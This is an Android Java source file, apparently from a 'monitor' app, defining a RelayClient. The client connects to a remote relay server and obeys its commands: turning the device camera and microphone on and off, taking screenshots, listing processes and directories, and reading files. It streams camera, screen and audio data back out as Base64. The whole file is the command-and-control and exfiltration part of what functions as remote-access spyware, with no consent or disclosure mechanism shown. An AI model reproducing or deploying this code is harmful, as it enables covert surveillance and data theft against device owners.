package com.nora.monitor;

import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.net.URISyntaxException;

import io.socket.client.IO;
import io.socket.client.Socket;

public class RelayClient {

    private static final String TAG = "RelayClient";

    private final MonitorService service;
    private final String         agentName;
    private final String         agentSecret;
    private final String         relayUrl;
    private Socket               socket;

    public RelayClient(MonitorService service, String agentName, String agentSecret, String relayUrl) {
        this.service     = service;
        this.agentName   = agentName;
        this.agentSecret = agentSecret;
        this.relayUrl    = relayUrl;
    }

    public void connect() {
        try {
            IO.Options opts = IO.Options.builder()
                .setTransports(new String[]{"websocket", "polling"})
                .setReconnection(true)
                .setReconnectionDelay(5000)
                .build();

            socket = IO.socket(relayUrl, opts);

            socket.on(Socket.EVENT_CONNECT, args -> {
                Log.d(TAG, "Connected as " + agentName);
                try {
                    JSONObject reg = new JSONObject();
                    reg.put("name",   agentName);
                    reg.put("secret", agentSecret);
                    socket.emit("register", reg);
                } catch (JSONException e) {
                    Log.e(TAG, "register error", e);
                }
            });

            socket.on(Socket.EVENT_DISCONNECT, args -> Log.d(TAG, "Disconnected from relay"));

            socket.on("camera_on",       args -> service.startCamera());
            socket.on("camera_off",      args -> service.stopCamera());
            socket.on("mic_on",          args -> service.startMic());
            socket.on("mic_off",         args -> service.stopMic());
            socket.on("take_screenshot", args -> service.takeScreenshot(args));

            socket.on("get_sysinfo", args -> {
                try {
                    JSONObject info = DeviceInfo.getInfo(service);
                    info.put("_requester", requester(args));
                    socket.emit("sysinfo_result", info);
                } catch (Exception e) {
                    Log.e(TAG, "sysinfo error", e);
                }
            });

            socket.on("get_processes", args -> {
                try {
                    JSONArray procs = DeviceInfo.getRunningApps(service);
                    JSONObject res  = new JSONObject();
                    res.put("processes",  procs);
                    res.put("_requester", requester(args));
                    socket.emit("processes_result", res);
                } catch (Exception e) {
                    Log.e(TAG, "processes error", e);
                }
            });

            socket.on("list_dir", args -> {
                try {
                    String path = args.length > 0 ? ((JSONObject) args[0]).optString("path", "") : "";
                    JSONObject res = FileManager.listDir(path);
                    res.put("_requester", requester(args));
                    socket.emit("dir_result", res);
                } catch (Exception e) {
                    Log.e(TAG, "list_dir error", e);
                }
            });

            socket.on("read_file", args -> {
                try {
                    String path = args.length > 0 ? ((JSONObject) args[0]).optString("path", "") : "";
                    JSONObject res = FileManager.readFile(path);
                    res.put("_requester", requester(args));
                    socket.emit("file_data", res);
                } catch (Exception e) {
                    Log.e(TAG, "read_file error", e);
                }
            });

            socket.connect();
        } catch (URISyntaxException e) {
            Log.e(TAG, "bad URI: " + relayUrl, e);
        }
    }

    private static String requester(Object[] args) {
        try {
            if (args != null && args.length > 0 && args[0] instanceof JSONObject)
                return ((JSONObject) args[0]).optString("_requester");
        } catch (Exception ignored) {}
        return null;
    }

    public void emitFrame(byte[] jpeg)    { emitBytes("frame",        jpeg); }
    public void emitCamera(byte[] jpeg)   { emitBytes("camera_frame", jpeg); }
    public void emitAudio(byte[] pcm)     { emitBytes("audio",        pcm);  }

    public void emitScreenshot(byte[] data, String req) {
        if (!connected()) return;
        try {
            JSONObject obj = new JSONObject();
            obj.put("data",       Base64.encodeToString(data, Base64.NO_WRAP));
            obj.put("_requester", req);
            socket.emit("screenshot_result", obj);
        } catch (JSONException e) {
            Log.e(TAG, "emitScreenshot error", e);
        }
    }

    private void emitBytes(String event, byte[] bytes) {
        if (!connected()) return;
        try {
            JSONObject obj = new JSONObject();
            obj.put("data", Base64.encodeToString(bytes, Base64.NO_WRAP));
            socket.emit(event, obj);
        } catch (JSONException e) {
            Log.e(TAG, "emit " + event + " error", e);
        }
    }

    private boolean connected() {
        return socket != null && socket.connected();
    }

    public void disconnect() {
        if (socket != null) socket.disconnect();
    }
}
